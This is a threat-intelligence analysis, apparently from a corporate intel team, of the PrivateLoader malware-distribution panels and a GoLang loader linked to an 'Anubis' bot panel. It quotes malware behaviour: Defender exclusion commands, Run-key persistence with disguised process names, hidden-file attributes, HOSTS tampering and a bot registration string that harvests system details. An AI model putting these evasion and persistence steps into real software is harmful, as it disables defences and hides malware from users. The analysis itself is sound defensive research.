Intel471 released a report[1] on a loader system being leveraged for distribution of various
crimeware malware families:
Qbot
SmokeLoader
TrickBot
1/17

NanoCore RAT
Redline stealer
njRat
Djvu ransomware
Vidar stealer
Remcos RAT
Tofsee spambot
QRat
Lockbit ransomware
Dridex
DanaBot
The diversity of the malware families led the Walmart Cyber Intel team to investigate further.

Infrastructure Analysis
The report mentioned an administrator panel located on the main command and control
server. The panel is named “EZCubePanel” by the author. The configuration options are
fairly straightforward as laid out in the intel471 offering. The panel is configured to deliver
links and browser extensions.

Links
The browser extensions did appear to be suspended at the time but were likely utilized in
previous campaigns.

Extensions
While the AdminLTE open source bootstrap template has been implemented to streamline
the UI process, the main functionality is implemented in php.
Curiously, two geo tags appear to be linked to specific domains. The tag WW_5 is hard
coded for ezsoftware[.]ru, while the tag WW_8 is linked to vip-space[.]com & vip-files[.]com

Domains

Installer
The private loader installer makes some interesting requests.

After downloading a proxy list and contacting statistics.php, the payload link is encrypted with
a simple xor routine and delivered to the client.

Database
Infection counts show a large loader based system, which mimics some of the data
presented in the report by Intel471.

According to the report, “Privacy tools” domains were utilized as a primary delivery for
SmokeLoader. After checking out a few of the domains, some interesting stats were
discovered. In November of 2021, over a period of 20 days there were over 125K loads. For
December 2021, roughly 82K for pab2 and pab3.

Stats
The stat panel below appeared to show loads for the affiliate IDs pub1, pub2 and pub3.
Nearly 33K loads in nine days.

Current Stats
During our investigation we found other loaders delivered by PrivateLoader. Similar to what
the report stated. However, during some of the loader executions, we observed traffic that
did not appear to line up with the other stealers.

After further inspection of the ‘build_dl’ traffic, one of the uncovered loader samples was
actually developed in GoLang.
Upon execution, the sample performs a check to see if it has admin privileges by attempting
to open \\PHYSICALDRIVE:

Next it takes a screenshot:

And then proceeds to install itself:

Some of the strings are obfuscated but the deobfuscation is simply subtracting one from
every character:
9/17

def deobf(a):

b = bytearray(a)

for i in range(len(b)):

b[i] -=1

return b

So now we can easily map out the install process steps, the malware leverages powershell
to setup some exclusion paths:
powershell -Command Add-MpPreference -ExclusionPathon:
AppData\Local\Microsoft

AppData\Local\Temp

Sets a runkey in Software\\Microsoft\\Windows\\CurrentVersion\\Run and the registry name
and install name will be randomly generated from a hardcoded list of possibilities, install
names:
svchostcsrssrundll32winlogonsmsstaskhostunsecappAdobeARMwinsysjuschedBCUwscntfyconhost

For the registry names:
Trion SoftworksMystic EntertainmentMicrosoft PartnersClient-Server Runtime
SubsystemNetworking Service

After then moving itself to the proper location it will use ‘attrib’ to set itself as a system file
and hidden:
attrib +S +H

Along with altering the HOSTS file: (edited for brevity)

And flushing the DNS cache:
ipconfig //flushdns

After installation the bot will connect to the C2 either over HTTP or TCP and register itself by
sending various information back to the C2 via TCP:
md5(cmd /c whoami) + “->Reg->[“ + Datetime + ”]->” + <cmd /c whoami> + “->” + <wmic
cpu get name> + “->” + <wmic path win32_VideoController get name> + “->” + <cmd /C
ver> + “->” +Bot Build + <isAdmin()>

11/17

Bot registration
For HTTP traffic an example can be seen below, the data sent to the server is obfuscated by
adding two to every byte:
POST /callback HTTP/1.1Host: redacted.x.x.xUser-Agent: Go-http-client/1.1ContentLength: 57Content-Type: application/x-www-form-urlencodedAccept-Encoding:
gzipcallback=HktgYcnn%22Cffgf%22%2F%22lwuejgf&reginfo=WugtMKV

After registration, the bot will check for tasks to perform:

Panel
The panel refers to itself as ‘ANUBIS PANEL’ and contains roughly 20K bots. The bots
appeared to be leveraged for crypto mining and distributing other malware.

The stats clearly show Anubis operators have been delivering thousands of installs each
week. In the case of Anubis, more than 500 unique binaries were distributed. The delivered
tasks from Anubis also appear to similarly overlap with those of PrivateLoader.
Over a period of 12 days, more than 11 GB of stealer logs were collected. While cracked
software is often overlooked in the world of CyberCrime, it is clearly underestimated as a
tactic.
